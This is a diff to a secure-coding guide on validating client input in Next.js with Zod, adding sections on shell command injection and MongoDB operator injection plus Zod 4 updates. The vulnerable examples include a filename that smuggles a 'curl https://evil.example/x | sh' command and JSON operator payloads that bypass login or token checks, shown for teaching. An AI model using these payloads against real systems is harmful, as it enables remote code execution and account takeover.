@@ -4,6 +4,21 @@
 
 Every piece of data from the client is hostile until validated. TypeScript types disappear at runtime — they provide zero security.
 
+## Contents
+
+- [The Rule](#the-rule)
+- [Server Action Validation](#server-action-validation)
+- [Route Handler Validation](#route-handler-validation)
+- [Mass Assignment Prevention](#mass-assignment-prevention)
+- [SQL Injection Prevention](#sql-injection-prevention)
+- [Command Injection (A05:2025)](#command-injection-a052025)
+- [NoSQL Operator Injection (A05:2025)](#nosql-operator-injection-a052025)
+- [XSS Prevention](#xss-prevention)
+- [Path Traversal Prevention](#path-traversal-prevention)
+- [Common Zod Patterns for API Input](#common-zod-patterns-for-api-input)
+- [Audit Patterns](#audit-patterns)
+- [Sources](#sources)
+
 ## The Rule
 
 **Validate all input on the server, at the boundary, before any logic runs.**
@@ -42,7 +57,7 @@ export async function createPost(input: unknown) {
 
   const parsed = CreatePostSchema.safeParse(input)
   if (!parsed.success) {
-    return { error: parsed.error.flatten().fieldErrors }
+    return { error: z.flattenError(parsed.error).fieldErrors }
   }
 
   await db.insert(posts).values({
@@ -52,6 +67,8 @@ export async function createPost(input: unknown) {
   })
 }
 ```
+
+Zod 4 deprecates `error.flatten()` and `error.format()`. Use `z.flattenError(error)` for one level of `fieldErrors` and `formErrors`, or `z.treeifyError(error)` for nested schemas.
 
 ### FormData Validation
 
@@ -70,7 +87,7 @@ export async function submitContact(formData: FormData) {
   })
 
   if (!parsed.success) {
-    return { error: parsed.error.flatten().fieldErrors }
+    return { error: z.flattenError(parsed.error).fieldErrors }
   }
 
   await sendEmail(parsed.data.email, parsed.data.message)
@@ -110,7 +127,7 @@ export async function POST(request: Request) {
   const parsed = CreateUserSchema.safeParse(body)
   if (!parsed.success) {
     return Response.json(
-      { error: parsed.error.flatten().fieldErrors },
+      { error: z.flattenError(parsed.error).fieldErrors },
       { status: 422 }
     )
   }
@@ -148,7 +165,7 @@ export async function PATCH(request: Request) {
 
   const parsed = UpdateProfileSchema.safeParse(await request.json())
   if (!parsed.success) {
-    return Response.json({ error: parsed.error.flatten() }, { status: 422 })
+    return Response.json({ error: z.flattenError(parsed.error) }, { status: 422 })
   }
 
   await db.update(users).set(parsed.data).where(eq(users.id, user.id))
@@ -207,6 +224,91 @@ const result = await db
   .from(users)
   .orderBy(users[sortBy as keyof typeof users])
 ```
+
+## Command Injection (A05:2025)
+
+`exec()` hands one string to `/bin/sh` (or `cmd.exe`), so `;`, `|`, `$()` and backticks in user input run as commands. `execFile()` and `spawn()` start the program directly, with each argument as a separate array item and no shell, unless you pass `shell: true`.
+
+```tsx
+// FAIL: user input inside a shell string
+import { exec } from 'node:child_process'
+
+export async function POST(request: Request) {
+  const { filename } = await request.json()
+  exec(`convert uploads/${filename} -resize 200x200 thumbs/${filename}`)
+  // filename: "a.png; curl https://evil.example/x | sh"
+}
+
+// PASS: no shell, argument array, validated input, fixed program
+import { execFile } from 'node:child_process'
+import { promisify } from 'node:util'
+import { z } from 'zod'
+
+const run = promisify(execFile)
+const ThumbSchema = z.object({ id: z.uuid() }) // our ID, not a filename
+
+export async function POST(request: Request) {
+  const parsed = ThumbSchema.safeParse(await request.json().catch(() => null))
+  if (!parsed.success) return Response.json({ error: 'Invalid input' }, { status: 400 })
+
+  const { id } = parsed.data
+  await run('convert', [`uploads/${id}.png`, '-resize', '200x200', `thumbs/${id}.png`], {
+    timeout: 10_000,
+  })
+  return Response.json({ ok: true })
+}
+```
+
+| Rule | Why |
+|------|-----|
+| Use a library call instead of a command when one exists | No interpreter, no injection |
+| `execFile` or `spawn` with an array, never `exec` or `shell: true` | Shell metacharacters stay literal text |
+| Allowlist the program, validate each argument | No shell still lets a value become an option such as `--output=/etc/x` |
+| Put `--` before user values when the tool supports it | Ends option parsing, so `-rf` stays a filename |
+| On Windows, `.bat` and `.cmd` need a shell | Avoid running them with user input at all |
+| Run with the least privilege | Limits what a successful injection can do |
+
+## NoSQL Operator Injection (A05:2025)
+
+MongoDB builds queries from objects, so string concatenation is rarely the problem. The problem is a value that should be a string arriving as an object. JSON bodies, and query-string parsers that support `a[b]=c`, can both produce one.
+
+```tsx
+// FAIL: the body's values go straight into the filter
+export async function POST(request: Request) {
+  const { email, password } = await request.json()
+  const user = await usersCollection.findOne({ email, password: hash(password) })
+  // Body: { "email": { "$ne": null }, ... } matches the first user in the collection
+}
+
+// FAIL: a reset token lookup with no type check
+const record = await tokens.findOne({ token: body.token }) // { "$gt": "" } matches any token
+
+// PASS: Zod pins every field to a scalar before the filter is built
+import { z } from 'zod'
+
+const LoginSchema = z.strictObject({
+  email: z.email(),
+  password: z.string().min(1).max(1024),
+})
+
+export async function POST(request: Request) {
+  const parsed = LoginSchema.safeParse(await request.json().catch(() => null))
+  if (!parsed.success) return Response.json({ error: 'Invalid email or password' }, { status: 400 })
+
+  const user = await usersCollection.findOne({ email: parsed.data.email }) // a string, never an object
+  if (!user || !(await verifyPassword(parsed.data.password, user.passwordHash))) {
+    return Response.json({ error: 'Invalid email or password' }, { status: 401 })
+  }
+  // ...
+}
+```
+
+- Validate the type of every field that reaches a filter. `z.string()` rejects `{ "$ne": null }`
+- Never pass a client object through as a filter, sort, or projection. Build it from validated scalars
+- Allowlist field names the client may filter or sort on, as with SQL columns above
+- Do not accept `$where`, `$expr`, `$function`, or `$regex` from the client. `$where` runs JavaScript inside the database
+- Turn off server-side JavaScript in MongoDB when you do not need it
+- A check that rejects strings starting with `$` is weaker than a schema. It does not check types or fields
 
 ## XSS Prevention
 
@@ -301,7 +403,7 @@ const SearchSchema = z.object({
   category: z.enum(['all', 'posts', 'users']).default('all'),
 })
 
-// File upload metadata
+// File upload metadata. These are the client's claims. Check the bytes too: file-uploads.md
 const UploadSchema = z.object({
   filename: z.string().max(255).regex(/^[a-zA-Z0-9._-]+$/),
   contentType: z.enum(['image/jpeg', 'image/png', 'image/webp', 'application/pdf']),
@@ -343,8 +445,13 @@ grep -rn "request.json()" --include="*.ts" -A5 | grep -v "safeParse\|parse(\|Sch
 
 ## Sources
 
-- [OWASP API3:2023 — Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
-- [OWASP A05:2025 — Injection](https://owasp.org/Top10/2025/A05_2025-Injection/)
+- [OWASP API3:2023 — Broken Object Property Level Authorization](https://api-security.owasp.org/editions/2023/en/0xa3-broken-object-property-level-authorization/)
+- [OWASP A05:2025 — Injection](https://top10.owasp.org/2025/A05_2025-Injection/)
+- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
+- [Node.js 22 `child_process`](https://nodejs.org/docs/latest-v22.x/api/child_process.html)
+- [OWASP NoSQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NoSQL_Security_Cheat_Sheet.html)
+- [OWASP WSTG: Testing for NoSQL Injection](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Injection/05.6-NoSQL_Injection.md)
+- [Zod error formatting](https://zod.dev/error-formatting) and [Zod 4 changelog](https://zod.dev/v4/changelog)
 - [Next.js Data Security Guide](https://nextjs.org/docs/app/guides/data-security)
 - [Zod Documentation](https://zod.dev)
 - [React DOM 19.2.4 `sanitizeURL`](https://github.com/facebook/react/blob/v19.2.4/packages/react-dom-bindings/src/shared/sanitizeURL.js) (checked 2026-10-21; URL Injection section only)
